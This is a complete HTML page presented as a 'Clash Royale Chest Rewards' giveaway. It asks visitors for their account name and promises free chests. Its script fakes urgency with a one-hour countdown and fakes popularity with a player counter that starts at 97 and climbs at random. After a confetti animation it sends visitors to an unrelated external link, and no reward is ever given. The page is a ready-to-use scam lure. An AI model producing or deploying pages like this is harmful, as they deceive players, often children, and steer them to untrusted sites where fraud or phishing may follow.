<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Clash Royale Chest Rewards</title>
<style>
body {font-family: Arial, sans-serif; background:#0f172a; color:white; text-align:center; margin:0; padding:0; overflow-x:hidden;}
header {padding:25px; background:#1e293b; font-size:28px; font-weight:bold; letter-spacing:1px; text-shadow:1px 1px 2px #000;}
.container {padding:60px 20px;}
h1 {font-size:36px; margin-bottom:25px; color:#facc15; text-shadow:1px 1px 2px #000; animation: fadeIn 1s;}
p {font-size:18px; margin-bottom:30px; color:#e5e7eb;}
input {padding:15px; width:80%; max-width:400px; border-radius:12px; border:none; margin-bottom:20px; font-size:16px; transition:0.3s;}
input:focus {outline:none; box-shadow:0 0 15px #facc15;}
.btn {padding:15px 40px; background:#facc15; color:#0f172a; font-weight:bold; border-radius:12px; border:none; cursor:pointer; transition:0.3s; font-size:16px; box-shadow:0 5px 15px rgba(0,0,0,0.3);}
.btn:hover {background:#eab308; box-shadow:0 7px 20px rgba(0,0,0,0.4); transform: translateY(-2px);}
.stats {margin:35px 0; font-size:20px; color:#3b82f6; text-shadow:1px 1px 2px #000;}
.timer {font-size:22px; color:#f87171; margin-bottom:20px; font-weight:bold;}
.counter-num {display:inline-block; width:24px; animation:roll 0.3s ease-in-out;}
@keyframes roll {0%{transform:translateY(-100%);}100%{transform:translateY(0);}}
@keyframes fadeIn {0%{opacity:0; transform:translateY(-20px);}100%{opacity:1; transform:translateY(0);}}
.confetti {position:absolute; width:10px; height:10px; border-radius:50%; top:0; animation:fall 2s linear infinite;}
@keyframes fall {0%{transform:translateY(-10px) rotate(0deg);}100%{transform:translateY(800px) rotate(360deg);}}
@media (max-width:500px){
  h1 {font-size:28px;}
  .btn {width:90%;}
  input {width:90%;}
}
</style>
</head>
<body>

<header>🏆 Clash Royale Chest Rewards</header>

<div class="container">
  <h1>Claim Your Chest Rewards Now!</h1>
  <p>Enter your Clash Royale account name below to get your chest instantly.</p>

  <div class="timer">Offer expires in <span id="countdown">01:00:00</span></div>

  <input type="text" id="username" placeholder="Your account name" required>
  <br>
  <button class="btn" onclick="submitForm()">Open Chest</button>

  <div class="stats">
    <p>Today <span id="counter">0</span> players have opened their chests</p>
  </div>
</div>

<footer>&copy; 2026 Clash Royale Rewards. All rights reserved.</footer>

<script>
// --- Countdown 1 hour ---
let totalTime = 60*60; // 1 hour in seconds
const countdownEl = document.getElementById('countdown');
const countdownInterval = setInterval(()=>{
  let hours = Math.floor(totalTime/3600);
  let minutes = Math.floor((totalTime % 3600)/60);
  let seconds = totalTime % 60;
  countdownEl.innerText = `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
  totalTime--;
  if(totalTime < 0){
    clearInterval(countdownInterval);
    countdownEl.innerText = "00:00:00 - Offer expired!";
    document.querySelector('.btn').disabled = true;
    document.querySelector('.btn').style.background = "#9ca3af";
  }
},1000);

// --- Animated counter starting at 97 ---
let counterEl = document.getElementById('counter');
let counter = 97;
updateCounter(counter);

setInterval(()=>{
  counter += Math.floor(Math.random()*2); // increase slowly
  updateCounter(counter);
},2500+Math.random()*1000);

function updateCounter(num){
  counterEl.innerHTML = '';
  let strNum = num.toString();
  for(let i=0;i<strNum.length;i++){
    let span = document.createElement('span');
    span.className='counter-num';
    span.innerText = strNum[i];
    counterEl.appendChild(span);
  }
}

// --- Confetti effect ---
function createConfetti(){
  for(let i=0;i<50;i++){
    const confetti = document.createElement('div');
    confetti.className='confetti';
    confetti.style.left=Math.random()*100+'%';
    confetti.style.background=`hsl(${Math.random()*360},100%,50%)`;
    confetti.style.animationDuration=(Math.random()*2+2)+'s';
    document.body.appendChild(confetti);
    setTimeout(()=>{confetti.remove();},4000);
  }
}

// --- Submit form safely ---
function submitForm(){
  const username = document.getElementById('username').value.trim();
  if(!username){ alert('Please enter your account name!'); return;}
  createConfetti();
  setTimeout(()=>{ window.location.href='https://Ogam.site/cl/i/n66xj9'; },1000);
}
</script>

</body>
</html>
